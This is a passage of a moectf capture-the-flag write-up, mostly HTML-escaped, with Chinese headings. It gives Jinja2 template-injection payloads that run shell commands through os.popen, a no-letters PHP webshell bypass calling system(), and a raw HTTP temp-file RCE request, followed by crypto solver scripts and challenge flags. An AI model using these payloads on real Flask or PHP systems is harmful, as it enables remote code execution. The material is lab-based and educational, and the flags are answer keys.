&#x27;&#x27;)        if not username or not password:            login_msg = &quot;&quot;&quot;            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;                &lt;div class=&quot;result-title&quot;&gt;é˜µæ³•åé¦ˆ&lt;/div&gt;                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-fail&#x27;&gt;ç”¨æˆ·åæˆ–å¯†ç ä¸èƒ½ä¸ºç©º&lt;/div&gt;&lt;/div&gt;            &lt;/div&gt;            &quot;&quot;&quot;        else:            login_msg = render_template_string(f&quot;&quot;&quot;            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;                &lt;div class=&quot;result-title&quot;&gt;é˜µæ³•åé¦ˆ&lt;/div&gt;                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-success&#x27;&gt;æ¬¢è¿ï¼š&#123;username&#125;&lt;/div&gt;&lt;/div&gt;            &lt;/div&gt;            &quot;&quot;&quot;)            for blk in blacklist:                if blk in username:                    login_msg = &quot;&quot;&quot;                    &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;                        &lt;div class=&quot;result-title&quot;&gt;é˜µæ³•åé¦ˆ&lt;/div&gt;                        &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-fail&#x27;&gt;Error&lt;/div&gt;&lt;/div&gt;                    &lt;/div&gt;                    &quot;&quot;&quot;    else:        login_msg = &quot;&quot;    return render_template(&quot;index.html&quot;, login_msg=login_msg)if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;, port=80)\n\n&#123;%print (cycler.next[&#x27;_&#x27;+&#x27;_&#x27;+&#x27;g&#x27;&#x27;lobals&#x27;+&#x27;_&#x27;+&#x27;_&#x27;].os.popen(&#x27;ls /&#x27;)).read()%&#125;app bin dev entrypoint.sh etc flag home lib media mnt opt proc root run sbin srv sys tmp usr var\n\n&#123;%print (cycler.next[&#x27;_&#x27;+&#x27;_&#x27;+&#x27;g&#x27;&#x27;lobals&#x27;+&#x27;_&#x27;+&#x27;_&#x27;].os.popen(&#x27;cat /f*&#x27;)).read()%&#125;\n\n\nmoectf&#123;0e58bf14-90e9-97dd-a2e8-64f6708bea38&#125;\n\n28.è¡€æµ·æ ¸å¿ƒÂ·åƒå¹´æ‰‹æ®µ&#123;&#123;lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,&quot;protocol_version&quot;,lipsum.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;strings+/usr/bin/rev&#x27;).read())&#125;&#125;\n\n\n&#123;&#123;lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,&quot;protocol_version&quot;,lipsum.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;/usr/bin/rev%20--HDdss%20cat%20/flag&#x27;).read())&#125;&#125;\n\n\nmoectf&#123;7c0228bd-3da2-1827-3848-fe54399acdf6&#125;\n\n29.è¿™æ˜¯â€¦Webshell?&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;shell&#x27;])) &#123;    $shell = $_GET[&#x27;shell&#x27;];    if(!preg_match(&#x27;/[A-Za-z0-9]/is&#x27;, $_GET[&#x27;shell&#x27;])) &#123;        eval($shell);    &#125; else &#123;        echo &quot;Hacker!&quot;;    &#125;&#125;?&gt;\n\næ— æ•°å­—æ— å­—æ¯rce\nhttps://www.cnblogs.com/pursue-security/p/15404150.html\nä¸€èˆ¬éƒ½æ˜¯é€šè¿‡å¼‚æˆ–æˆ–è€…å–å\n$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[_]);POST:_=system(cat /f*);\n\n\nmoectf&#123;0f39c886-86fe-94d9-1247-062f339c9b5f&#125;\n\n30.è¿™æ˜¯â€¦Webshell?_revenge&lt;?phphighlight_file(__FILE__);if (isset($_GET[&#x27;shell&#x27;])) &#123;    $shell = $_GET[&#x27;shell&#x27;];    if (strlen($shell) &gt; 30) &#123;        die(&quot;error: shell length exceeded&quot;);    &#125;    if (preg_match(&quot;/[A-Za-z0-9_$]/&quot;, $shell)) &#123;        die(&quot;error: shell not allowed&quot;);    &#125;    eval($shell);&#125;\n\nä¸´æ—¶æ–‡ä»¶rce,çœ‹pç‰›çš„æ–‡ç« :https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html\nexp:\nPOST /index.php?shell=%3f%3e%3c%3f%3d%60%2e%20%2f%3f%3f%3f%2f%3f%3f%3f%3f%3f%3f%3f%3f%5b%40%2d%5b%5d%60%3b%3f%3e HTTP/1.1Host: 127.0.0.1:53669Content-Length: 292Cache-Control: max-age=0DNT: 1Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysDh6g03MqJBgoRi2User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Connection: close------WebKitFormBoundarysDh6g03MqJBgoRi2Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;Content-Type: text/plain#!/bin/shcat /flag------WebKitFormBoundarysDh6g03MqJBgoRi2Content-Disposition: form-data; name=&quot;submit&quot;shang------WebKitFormBoundarysDh6g03MqJBgoRi2--\n\n\nmoectf&#123;c40c34e4-5121-e752-8741-e97209bcc5dc&#125;\n\n\n\n\n\nå¯†ç Cryptoå…¥é—¨æŒ‡åŒ—from Crypto.Util.number import long_to_bytes# æ›¿æ¢ä¸ºä½ çš„çœŸå®å‚æ•°p = 11540963715962144951763578255357417528966715904849014985547597657698304891044841099894993117258279094910424033273299863589407477091830213468539451196239863c1 = 6652053553055645358275362259554856525976931841318251152940464543175108560132949610916012490837970851191204144757409335011811874896056430105292534244732863c2 = 2314913568081526428247981719100952331444938852399031826635475971947484663418362533363591441216570597417789120470703548843342170567039399830377459228297983x = 8010957078086554284020959664124784479610913596560035011951143269559761229114027738791440961864150225798049120582540951874956255115884539333966429021004214# ElGamalè§£å¯†æ­¥éª¤s = pow(c1, x, p)            # s = c1^x mod ps_inv = pow(s, -1, p)        # è®¡ç®—sçš„æ¨¡é€†m = (c2 * s_inv) % p         # è®¡ç®—æ˜æ–‡æ•´æ•°m# è½¬æ¢ä¸ºå­—èŠ‚ä¸²ï¼Œè§£ç ä¸ºå­—ç¬¦ä¸²ï¼ˆä¸€èˆ¬UTF-8ï¼‰flag_bytes = long_to_bytes(m)print(flag_bytes.decode())\n\n\nmoectf&#123;th1s_1s_y0ur_f1rst_ElG@m@l&#125;\n\nbaby_nextfrom gmpy2 import isqrt, next_primefrom Crypto.Util.number import long_to_bytesimport math# é¢˜ç›®ç»™å®šçš„å‚æ•°n = 96742777571959902478849172116992100058097986518388851527052638944778038830381328778848540098201307724752598903628039482354215330671373992156290837979842156381411957754907190292238010742130674404082688791216045656050228686469536688900043735264177699512562466087275808541376525564145453954694429605944189276397c = 17445962474813629559693587749061112782648120738023354591681532173123918523200368390246892643206880043853188835375836941118739796280111891950421612990713883817902247767311707918305107969264361136058458670735307702064189010952773013588328843994478490621886896074511809007736368751211179727573924125553940385967e = 65537# è®¡ç®—nçš„å¹³æ–¹æ ¹ä½œä¸ºpçš„ä¼°è®¡å€¼sqrt_n = isqrt(n)# å®šä¹‰æœç´¢èŒƒå›´ï¼šæ ¹æ®ç´ æ•°é—´éš”ç†è®ºï¼Œpåº”ä½äº sqrt(n) - 4e7 é™„è¿‘search_range = 40000000  # 4000ä¸‡start = max(2, sqrt_n - search_range)  # æœç´¢èµ·ç‚¹end = sqrt_n                            # æœç´¢ç»ˆç‚¹# æ­¥éª¤1ï¼šåœ¨ä¼°ç®—èŒƒå›´å†…æœç´¢èƒ½æ•´é™¤nçš„ç´ æ•°found = Falsep = Nonefor candidate in range(start, end + 1):    # æ£€æŸ¥æ˜¯å¦æ•´é™¤    if n % candidate == 0:        # éªŒè¯å€™é€‰æ•°æ˜¯å¦ä¸ºç´ æ•°ï¼ˆå°ç´ æ•°å¿«é€ŸéªŒè¯ï¼‰        if next_prime(candidate - 1) == candidate:            p = candidate            found = True            break    # æ¯å¤„ç†10ä¸‡ä¸ªæ•°å­—æ˜¾ç¤ºè¿›åº¦    if (candidate - start) % 100000 == 0:        progress = (candidate - start) / (end - start) * 100        print(f&quot;æ‰«æè¿›åº¦: &#123;progress:.2f&#125;%&quot;)if not found:    raise ValueError(&quot;æœªæ‰¾åˆ°åˆé€‚çš„ç´ æ•°å› å­pï¼Œå°è¯•æ‰©å¤§æœç´¢èŒƒå›´&quot;)# è®¡ç®—å¦ä¸€ä¸ªç´ æ•°å› å­qq = n // pprint(f&quot;æ‰¾åˆ°å› å­: p = &#123;p&#125;&quot;)print(f&quot;q = &#123;q&#125;&quot;)# æ­¥éª¤2ï¼šéªŒè¯qç¡®å®æ˜¯pçš„ç¬¬114514ä¸ªåç»§ç´ æ•°current = pfor count in range(1, 114515):  # éœ€è¦114514æ¬¡next_prime    current = next_prime(current)    # æ˜¾ç¤ºè¿›åº¦    if count % 10000 == 0:        print(f&quot;éªŒè¯è¿›åº¦: &#123;count&#125;/114514&quot;)if current != q:    raise ValueError(&quot;qä¸æ˜¯pçš„åç»§ç¬¬114514ä¸ªç´ æ•°ï¼Œè¯·æ£€æŸ¥æœç´¢é€»è¾‘&quot;)print(&quot;éªŒè¯é€šè¿‡ï¼šqæ˜¯pçš„ç¬¬114514ä¸ªåç»§ç´ æ•°&quot;)phi = (p - 1) * (q - 1)d = pow(e, -1, phi)m = pow(c, d, n)flag = long_to_bytes(m)print(&quot;è§£å¯†åçš„Flag:&quot;, flag.decode())\n\n\nmoectf&#123;vv0W_p_m1nu5_q_i5_r34l1y_sm4lI&#125;\n\nez_squarefrom Crypto.Util.number import long_to_bytes, inverse, isPrimeimport math# å·²çŸ¥æ•°æ®n = 83917281059209836833837824007690691544699901753577294450739161840987816051781770716778159151802639720854808886223999296102766845876403271538287419091422744267873129896312388567406645946985868002735024896571899580581985438021613509956651683237014111116217116870686535030557076307205101926450610365611263289149c = 69694813399964784535448926320621517155870332267827466101049186858004350675634768405333171732816667487889978017750378262941788713673371418944090831542155613846263236805141090585331932145339718055875857157018510852176248031272419248573911998354239587587157830782446559008393076144761176799690034691298870022190hint = 5491796378615699391870545352353909903258578093592392113819670099563278086635523482350754035015775218028095468852040957207028066409846581454987397954900268152836625448524886929236711403732984563866312512753483333102094024510204387673875968726154625598491190530093961973354413317757182213887911644502704780304e = 65537# 1. æšä¸¾ k æ‰¾åˆ° (p+q)for k in range(1, 1000):    s2 = hint + k * n  # s^2 = hint + k*n    s = math.isqrt(s2)    if s * s == s2:        print(f&quot;[+] Found s = p+q with k=&#123;k&#125;&quot;)        breakelse:    raise ValueError(&quot;s not found&quot;)# 2. è§£ p,q# s^2 - 4n = (p-q)^2diff2 = s * s - 4 * nt = math.isqrt(diff2)if t * t != diff2:    raise ValueError(&quot;Not a square for p-q&quot;)p = (s + t) // 2q = (s - t) // 2assert p * q == nassert isPrime(p) and isPrime(q)print(&quot;[+] p =&quot;, p)print(&quot;[+] q =&quot;, q)# 3. è®¡ç®—ç§é’¥ dphi = (p - 1) * (q - 1)d = inverse(e, phi)# 4. è§£å¯†m = pow(c, d, n)flag = long_to_bytes(m)print(&quot;[+] FLAG =&quot;, flag.decode())&#x27;&#x27;&#x27;moectf&#123;Ma7hm4t1c5_is_@_k1nd_0f_a2t&#125;&#x27;&#x27;&#x27;\n\nez_DESfrom Crypto.Cipher import DESimport itertoolsimport string# å·²çŸ¥å¯†æ–‡c = b&#x27;\\xe6\\x8b0\\xc8m\\t?\\x1d\\xf6\\x99sA&gt;\\xce \\rN\\x83z\\xa0\\xdc&#123;\\xbc\\xb8X\\xb2\\xe2q\\xa4&quot;\\xfc\\x07&#x27;# DES key å‰ 5 ä½å·²çŸ¥prefix = &quot;ezdes&quot;charset = string.ascii_letters + string.digits + string.punctuation# çˆ†ç ´åä¸‰ä½for combo in itertools.product(charset, repeat=3):    key_str = prefix + &#x27;&#x27;.join(combo)    key = key_str.encode(&#x27;utf-8&#x27;)    cipher = DES.new(key, DES.MODE_ECB)    pt = cipher.decrypt(c)    # æ£€æŸ¥è§£å¯†ç»“æœ    if b&quot;moectf&#123;&quot; in pt:        print(&quot;[+] Found key:&quot;, key_str)        print(&quot;[+] Plaintext (raw):&quot;, pt)        print(&quot;[+] Plaintext (decoded):&quot;, pt.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;))        break&#x27;&#x27;&#x27;[+] Found key: ezdes8br[+] Plaintext (raw): b&#x27;moectf&#123;_Ju5t envmEra+e.!&#125;\\x19\\x19\\x19\\x19\\x19\\x19\\x19&#x27;[+] Plaintext (decoded): moectf&#123;_Ju5t envmEra+e.!&#125;&#x27;&#x27;&#x27;\n\n# recover_flag.pyfrom Crypto.Util.number import long_to_bytesimport math# å·²çŸ¥å‚æ•°ï¼ˆä»ä½ ç»™å‡ºçš„æ•°æ®ç²˜è´´ï¼‰p = 258669765135238783146000574794031096183a = 144901483389896508632771215712413815934ciphertext = [102230607782303286066661803375943337852, 196795077203291879584123548614536291210, 41820965969318717978206410470942308653, 207485265608553973031638961376379316991, 126241934830164184030184483965965358511, 20250852993510047910828861636740192486, 103669039044817273633962139070912140023, 97337342479349334554052986501856387313, 159127719377115088432849153087501377529, 45764236700940832554086668329121194445, 35275004033464216369574866255836768148, 52905563179465420745275423120979831405, 17032180473319795641143474346227445013, 29477780450507011415073117531375947096, 55487351149573346854028771906741727601, 121576510894250531063152466107000055279, 69959515052241122548546701060784004682, 173839335744520746760315021378911211216, 28266103662329817802592951699263023295, 194965730205655016437216590690038884309, 208284966254343254016582889051763066574, 137680272193449000169293006333866420934, 250634504150859449051246497912830488025, 124228075953362483108097926850143387433, 232956176229023369857830577971626577196, 149441784891021006224395235471825205661, 118758326165875568431376314508740278934, 222296215466271835013184903421917936512, 49132466023594939909761224481560782731, 406286678537520849308828749751513339, 215122152883292859254246948661946520324, 81283590250399459209567683991648438199, 150395133067480380674905743031927410663, 5710878479977467762548400320726575491, 83627753774286426170934105100463456109, 164968224377869331545649899270867630850, 241057183685774160581265732812497247167, 109136287048010096863680430193408099828, 116313129605409961931811582899075031153, 202739016625709380026000805340243458300, 25408225921774957745573142542576755590, 151336258796933656160956289529558246702, 2947189044370494063643525166023973095, 228678413963736672394976193093568181979, 40627063032321835707220414670018641024, 55446789315226949622969082042881319148, 32219108726651509070669836923591948459, 134454924722414419191920784435633637634, 97952023967728640730045857104376826039, 20659076942504417479953787092276592682, 93281761173713729777326842152860901050, 133634773495582264000160065317239987936, 79976720152435218818731114555425458470, 234654694673289327542859971371886984118, 51332273108989067644245919615090753756, 134120280423303717489979349737802826605, 182001158305920226320085758522717203725, 98408798757865562737462169470346158516, 78200435603900368619334272308272773797, 232796357836930341547987600782979821555, 589106968861493082018132081244848952, 24186003230092331554886767628744415123, 236070626491251466741246103662922841423, 238699080882667864827094121849090696547, 141659873734297659078160283051728812410, 228977113517120063860252637394240795552, 236613527842969921794004708284265628300, 145522034982744654991661857596541755396, 249608374387044047328725156440984678776, 325110572051913836681821746093704556, 171492052199838424502681030556098576483, 156498865212994371079795360268866413702, 196747701509389071931992996873572785043, 70811811603137896158765356680364490781, 83672551582385607422240464086955462541, 117961603623637997457153763936550310698, 224448821395214505399297116719025174412, 4598815373009554321735225938200807251, 194892269604260726530091473301914449005, 127484628022155760909820605666827662175, 208706240846212140439291547368645656474, 14102286481104997303651684152195298336, 6129503335471304345451795609683770657, 103799668048593149396277157385628834185, 185813375481410513002496683918106238351, 233491689316882978147517340230794025796, 46274083097168831187719988888816378961, 119487551553664772614629936285345836934, 84340029922118279362389419277915602509, 88253743193124528032223101368846247085, 227895357640018330099501504941388167432, 92189947144174433744195727086236905626, 83114957902192791332190922428847199876, 173535754090441937731619031520699325122, 192309407933789484835602071782330798398, 255421921600128994923738650157598053776, 155535082468314012733563336837641958625, 49064798421022327310707074253263463055, 161216416471071644769301963857685054031, 252480348817188872515008985698620059851, 75854882798183185741756645038434215611, 256065006192683011190132982128640682537, 87507510173514424105732562474643251223, 163309795132131534875147566536485288212, 253583084320404985699510129361746869059, 253300112521651972637580307326576568313, 239027717080729650738678032571840680727, 117444657686971615526398894470673026034, 215470942802874046857958621181684551426, 58767098748728136687851735836323448020, 249357164697409977883764098879705065535, 174705348385893117518084017669958647345, 211108767177375215605155301209259781232, 57829566748907062397366819001461941421, 88265742700024922112974862134385921564, 80952107622167923709226013231566882261, 236078582132483864916117213281193714198, 193448482646563141692726575550417225891, 245972799166806058223048506073553726233, 10132977708896091601871557249244373666, 201785418152654519825849206312616081028, 15169816744048531212384271865884567710, 122545328290385950043826822277924297182, 202918646192255177261567701479991753600, 32696887488223731055835744711207261936, 88319352182963224921157305627381030375, 92381505322264045777004475690398861771, 189745654013352563126968415157143821842, 152254915005998949299817641843658795579, 198032433618991362619448347415342295581, 84073892809321676935569114878067118319, 82243805869584256211699602267760745768, 61994229948266781537191603999495995852, 253668765227759797787675352833142466255, 38865376724677211964966907748953557125, 134615436811268347303232550777225944929, 176932422465426107783498083830285780588, 207573742393618910694054452362826628208, 200033130835394442710748301293534928706, 127536063935293533700918451145963158658, 219125698281820710910675956971948816959, 179795893258398750139395156587561075767, 69649628109726874051635160004398498964, 241433717681314766463039563422535023524, 202664264135718511331695232476272832350, 205151096657425932591242432052912914182, 210305712465948130683966275157181140301, 196555690055906934925300527324955477733, 66817932643964538216259564711698986077, 95270796440975607179107356182889534333, 123226880424532374188134357659879826495, 53506495440223773538415807620524749240, 19253217887083870834249774316467647628, 165699356396365023442008488156823647206, 107809175498119862854792975070673056027, 250453989887421415931162217952559757164, 171492052199838424502681030556098576483, 133778166882550119563444625306816232463, 149009301604122447269581792013291889175, 9982418254629616281350713836647603294, 203486292122499140756846060502464655972, 157686696123400087437836943220926921848, 88338919773540412238116717043122711811, 113265824169274322024623493892867211478, 5549372099744960679418616304893848801, 12431828907518852062050349123660880165, 183957934738536914983862053251433028750, 42027289270308356303682029801998790750, 117406080036483925915502666019795783905, 154312255292300186042636734144948304054, 143706917273862261295046346995206133170, 50088136095338601440516112338120787526, 250634504150859449051246497912830488025, 8073010289877796888705519374892639903, 40049582814576788803483039836229025416, 227012342545923833983403067401561291645, 201776603581414625783054400184026088994, 55474945478884522762318445841998187357, 221515530211550293408010846844218019597, 172650752042211610909190315288155597255, 67046194931321172530462444254204111483, 207435868835185636819659137800256834557, 188063222224545200294767050268070647452, 58099349021260301211275261896736590564, 23598877596106927870697531042828774738, 58546308516383335224739442370238545000, 58125311541947998710088435169901475101, 238219925698115060748249043752036454438, 203910234934340893915761800653823457631, 190854889967769152565565000250829375099, 37573623890629846209257307181880876288, 226220240200270623843038279593586687278, 144246075981535671790438155977352345487, 14665770553338784222331493932533448756, 37992062606775322664977502677838074649, 47370175759976523832233910009306151684, 97047813247943880266351445874642842468, 237607444658797800072728280983357541134, 174853113478993738890584814806707459112, 17104608155861584438824639050715857607, 83639027011494777283064583268678718843, 237826165608708003941944469905843354705, 231707683915242052796886276983724691027, 146089830852925550139294146760718642221, 25604562707667550478623425477029052785, 108577663147976992047614498924706939204, 69040319834829375335287614995435269276, 169933229202934375632745753379104389929, 72693008284867494808267387710985847974, 158548279589965576940349068403862889270, 49458101234256610254825879149914255140, 24389558269688411084589654047215902968, 210567980379246548727819953025607019254, 110423375132252997825868399832298953831, 109589895677661968369424757992411668628, 66177577069199763925999718357846633613, 83602293803708828242273186265396676466, 172226271050176278536911356541786290551, 85799805809703976643034084477579915867, 179399990302447560847151603157937241688, 81687654752229170984692833277072534294, 160766441640281044008645821822296569868, 100306680611749750243920501921769642984, 42195187332833922597871030332905266026, 238918420772178508359295233180536910768, 221685929158944699801776621298532178665, 209349638787804999657456057184702655805, 183953393268431043006359511952782903516, 137364333131365794683132159746962959967, 15637689373906596015395350692459218048, 145956368418289159411911667337899986262, 197987711355277581048877821432652325207, 125421308989313724733467092345532539875, 90525081516582408488547894471421476595, 107405840115256692042814887586009104950, 71587500700172519801649824611045199280, 10155721246869986043302768283257682883, 100522792569358427133597834727509523742, 244473925018526409824670892423775482110, 50746138425761666610345252577572889037, 142188269919422432629363225167297071042, 8235113926890598897465093754260801947, 174540885017405784646782293055852044631, 171949847901434672429841435895697323702, 34391199559497599434575002007581170988, 7337868660819385932166025474594964373, 89608475952042154068811282935241824949, 162561097613906905390170334328135062933, 252566077272083954707900007055640560669, 4284637988579219107997224848114896904, 220026371387782427901244689037957398829, 86019060485320999498155965142619258089, 19304861731281576405798605142335886482, 123188238667151068575810494833929221938, 125089740978532716086813732154638565196, 252061524500088702951562270741214799294, 89528875472312768404823823905699760649, 63307407053590054220492282094909190524, 24389558269688411084589654047215902968, 43835777110183833958990705735152973942, 196543204310466258426232803779025620993, 225032412767857179129234169288824097261, 50292890880286260984317361296226049436, 64928956886509273090981701066528078331, 25408225921774957745573142542576755590, 235921667882292842303120860570747218086, 217132603855089441017750752624514343437, 11106129204256119599329380588789107048, 147501327490657927610543345089238991876, 158091159632919983870444592039392730373, 254215886971254771885657857148535673338, 129869106474614345624950211566868568809, 10425702332274469498479699675668087022, 136595953187315682777976356839442311764, 1607792140397737044118662059498732982, 23710000155612873207506044342091514799, 118571340370877720354330132780832828911, 194624784476702188629452374731837038856, 51332273108989067644245919615090753756, 240921043405288511960365826273938845156, 158670188709175825212687487436006138030, 133641825913283256858340618209700716053, 43054466484232130048301271684438593412, 20361972967806283315536154125012604660, 135700832615866572032111395529532615300, 160609169788639387827865051539103507016, 100576279475451993660766480883708996211, 215424685541583305069271024253690375127, 60018956375784961551937423504137141702, 107997941230633604720421526632224279451, 219482010609171816035007605036664317041, 22173526221024380740269311947729076493, 249746554302052221287371350978970766087, 93207359085331319264650563354951254906, 221421697282310997113867048083058096452, 61834092635779365101011109381392037516, 162215218701897689647766394615098617152, 141856131587452385513407955541400099703, 177910903795887762773545874929605680469, 228832704523723308335513552177377803295, 229427981969125094398744034150988525118, 217938760689082034514008764751385239765, 3238055163645731541423094980789895030, 42308449860804765793467328093112118974, 254764518926620089428032312378507653680, 215733901156118606036318409454786603209, 59640829345183339336712595595022506261, 33515071724475649656070325837411550208, 51175659069843551646353202764296812462, 211462959696081863041546889096760952490, 230559603938699838189391087728971115767, 85878911733601049548471257838175175563, 214134904074265214033878852207103328297, 160702405980652445507529591230654474171, 223755040649990285320102091954198427148, 166476753890268002826149533120107157745, 26283916639129998224675164834425763384, 232971495542024495583092055361321729894, 79741799146769724681649849525636816379, 228506526471280046809909301748098760369, 167502422063741368765891061653686283332, 26984184590668253713951516794937308166, 105952393031190074432183821281493254, 113823192955281698937767041115166174652, 93264047694114869263275726820602569731, 55481974783112950660682138071588408040, 108961894273530837550182447112767144669, 47975793549419083945738147934068241928, 204024371586357035343484206754422857590, 251859351272989525849999231358507018068, 75939709807860493804628805619699991501, 129031774446142139804436921156668129187, 110764318451937254261883856778359218969, 246404864722813298477426808193494673610, 153818236564405157581869620439634140065, 246125932167584353084676586883038397451]# 1) ç”Ÿæˆå°äº 2^16 çš„ç´ æ•°åˆ—è¡¨ï¼ˆsieveï¼‰def gen_primes_upto(n):    sieve = bytearray(b&#x27;\\x01&#x27;) * (n+1)    sieve[0:2] = b&#x27;\\x00\\x00&#x27;    for i in range(2, int(n**0.5)+1):        if sieve[i]:            step = i            start = i*i            sieve[start:n+1:step] = b&#x27;\\x00&#x27; * ((n - start)//step + 1)    return [i for i, isprime in enumerate(sieve) if isprime]primes16 = gen_primes_upto(65535)# 2) æ¢å¤æ¯”ç‰¹ä¸²bits = []total = len(ciphertext)bases = [a] + [a + d for d in range(1, 11)]  # a, a+1 .. a+10for idx, ci in enumerate(ciphertext, 1):    found = False    # å°è¯•æ¯ä¸ª base ä¸æ¯ä¸ª 16-bit ç´ æ•° e    for base_idx, base in enumerate(bases):        for e in primes16:            if pow(base, e, p) == ci:                bit = &#x27;0&#x27; if base_idx == 0 else &#x27;1&#x27;                bits.append(bit)                found = True                # å¯ä»¥æ‰“å°è°ƒè¯•ä¿¡æ¯                print(f&quot;[&#123;idx&#125;/&#123;total&#125;] match: base_index=&#123;base_idx&#125; (base=&#123;base if base_idx&lt;2 else &#x27;a+&#x27;+str(base-a)&#125;), e=&#123;e&#125;, bit=&#123;bit&#125;&quot;)                break        if found:            break    if not found:        # å¦‚æœæ²¡æ‰¾åˆ°ï¼Œè¯´æ˜æ•°æ®ç²˜è´´æœ‰é—æ¼æˆ–å­˜åœ¨å…¶ä»–éšæœºæ€§ï¼Œæ‰“å°å¹¶ä¸­æ–­        print(f&quot;[-] No match for ciphertext index &#123;idx&#125;&quot;)        raise SystemExit(1)# 3) æŠŠ bits æ‹¼å› bytes å¹¶è§£ç bitstr = &#x27;&#x27;.join(bits)bytes_list = [int(bitstr[i:i+8], 2) for i in range(0, len(bitstr), 8)]plaintext = bytes(bytes_list)print(&quot;Recovered (raw bytes):&quot;, plaintext)try:    print(&quot;Recovered (utf-8):&quot;, plaintext.decode())except:    print(&quot;Recovered (decoded with errors ignored):&quot;, plaintext.decode(errors=&#x27;ignore&#x27;))\n\n\nmoectf&#123;Y0u_h@v3_ju5t_s01v3d_7h1s_pr0b13m!&#125;\n\nhappy rsaimport mathn = 128523866891628647198256249821889078729612915602126813095353326058434117743331117354307769466834709121615383318360553158180793808091715290853250784591576293353438657705902690576369228616974691526529115840225288717188674903706286837772359866451871219784305209267680502055721789166823585304852101129034033822731e = 65537c = 125986017030189249606833383146319528808010980928552142070952791820726011301355101112751401734059277025967527782109331573869703458333443026446504541008332002497683482554529670817491746530944661661838872530737844860894779846008432862757182462997411607513582892540745324152395112372620247143278397038318619295886x = 522964948416919148730075013940176144502085141572251634384238148239059418865743755566045480035498265634350869368780682933647857349700575757065055513839460630399915983325017019073643523849095374946914449481491243177810902947558024707988938268598599450358141276922628627391081922608389234345668009502520912713141disc = 4 * x - 3sqrt_val = math.isqrt(disc)if sqrt_val ** 2 == disc:    s = (sqrt_val - 1) // 2    phi = n - s    d = pow(e, -1, phi)    m = pow(c, d, n)    flag = m.to_bytes((m.bit_length() + 7) // 8, &#x27;big&#x27;)    print(flag.decode())else:    print(&quot;Not a perfect square&quot;) &quot;&quot;&quot;&quot;&quot;&quot;\n\nLedengre_revengefrom Cryptodome.Cipher import AESfrom Cryptodome.Util.number import bytes_to_long, long_to_bytesimport copydef function(x, p):    if x &gt;= p:        y = x    elif pow(x, (p-1)//2, p) == 1:        y = pow(x, 2, p)    else:        y = pow(x, 3, p)    return yp_ = 71583805456773770888820224577418671344500223401233301642692926000191389937709key = 60679aes_key = long_to_bytes(key &lt;&lt; 107)cipher = AES.new(aes_key, AES.MODE_ECB)a = [[239, 239, 251, 239], [233, 227, 233, 251], [251, 239, 251, 233], [233, 227, 251, 233]]primes = set(sum(a, [])) | &#123;251&#125;dict_pr_inv = &#123;&#125;for pr in primes:    inv = [[] for _ in range(256)]    for x in range(256):        y = function(x, pr)        inv[y].append(x)    dict_pr_inv[pr] = invdef reverse_half(current, lis_input, a, dict_pr_inv, cipher):    lis = copy.deepcopy(lis_input)    for round_num in range(10):        bit_matrix = [[ (lis[row][col] &amp; 1) for col in range(4)] for row in range(4)]        for row in range(4):            for col in range(4):                lis[row][col] //= 2        new_S = [[0 for _ in range(4)] for _ in range(4)]        for row in range(4):            for col in range(4):                new_S[row][col] = current[row + 4 * col]        temp_S = [[0 for _ in range(4)] for _ in range(4)]        for row in range(4):            for col in range(4):                p2 = a[col][row]                target = new_S[row][col]                possibles = dict_pr_inv[p2][target]                filtered = []                for x in possibles:                    greater = 1 if x &gt; (p2 // 2) else 0                    if greater == bit_matrix[col][row]:                        filtered.append(x)                if len(filtered) != 1:                    print(f&quot;Multiple or no possibilities at row &#123;row&#125;, col &#123;col&#125;, round &#123;round_num&#125;: &#123;filtered&#125;, target=&#123;target&#125;, p2=&#123;p2&#125;&quot;)                    return None                temp_S[row][col] = filtered[0]        enc_S = [[0 for _ in range(4)] for _ in range(4)]        for row in range(4):            for col in range(4):                target = temp_S[row][col]                possibles = dict_pr_inv[251][target]                if not possibles:                    print(f&quot;No possibilities for target &#123;target&#125; with p=251 at row &#123;row&#125;, col &#123;col&#125;, round &#123;round_num&#125;&quot;)                    return None                enc_S[row][col] = possibles[0]        enc = bytes([enc_S[row][col] for col in range(4) for row in range(4)])        current = cipher.decrypt(enc)    return currentlis0 = [[341, 710, 523, 1016], [636, 366, 441, 790], [637, 347, 728, 426], [150, 184, 421, 733]]lis1 = [[133, 301, 251, 543], [444, 996, 507, 1005], [18, 902, 379, 878], [235, 448, 836, 263]]ms = [30565192635368786249732024567787542864212990230048954769681860484383995323228, 41018612821404984639088200009631128480287233171184346873011065515807394614481]for m in ms:    final_concat = long_to_bytes(m)    if len(final_concat) != 32:        final_concat = b&#x27;\\x00&#x27; * (32 - len(final_concat)) + final_concat    text0 = final_concat[:16]    text1 = final_concat[16:]    flag0 = reverse_half(text0, lis0, a, dict_pr_inv, cipher)    if flag0 is None:        print(f&quot;Failed to decrypt text0 for m=&#123;m&#125;&quot;)        continue    flag1 = reverse_half(text1, lis1, a, dict_pr_inv, cipher)    if flag1 is None:        print(f&quot;Failed to decrypt text1 for m=&#123;m&#125;&quot;)        continue    flag = flag0 + flag1    